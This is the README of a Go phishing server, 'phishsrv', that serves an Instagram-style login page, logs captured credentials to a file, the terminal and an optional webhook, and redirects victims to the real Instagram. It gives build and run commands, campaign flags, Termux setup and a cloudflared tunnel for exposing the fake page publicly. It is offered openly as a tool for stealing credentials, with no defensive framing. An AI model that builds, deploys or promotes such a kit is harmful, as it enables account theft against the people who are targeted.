# phishsrv
My first phishing repository..

# phishsrv

Single-binary Go server. Instagram-style login page. Captures credentials to
JSONL + live terminal + optional webhook.

## Build

```bash
go mod tidy
go build -o phishsrv .
```

## Run

```bash
./phishsrv -port 8080 -tpl templates/login.html -out captures.jsonl
```

## Flags

| flag | default | purpose |
|---|---|---|
| `-port` | `8080` | listen port |
| `-tpl` | `templates/login.html` | login page |
| `-out` | `captures.jsonl` | append captures here |
| `-redirect` | _(empty)_ | URL to send user after capture (server-side fallback) |
| `-webhook` | _(empty)_ | POST each capture as JSON |
| `-tag` | _(empty)_ | label for this campaign |

## Redirect after capture

Edit `templates/login.html`, top of `<script>`:

```js
const REDIRECT_URL = "https://www.instagram.com/";
```

## Termux

```bash
pkg install -y git golang
git clone <repo>
cd phishsrv
go build -o phishsrv .
./phishsrv -port 8080
```

## Public URL

```bash
pkg install -y cloudflared
cloudflared tunnel --url http://127.0.0.1:8080
```
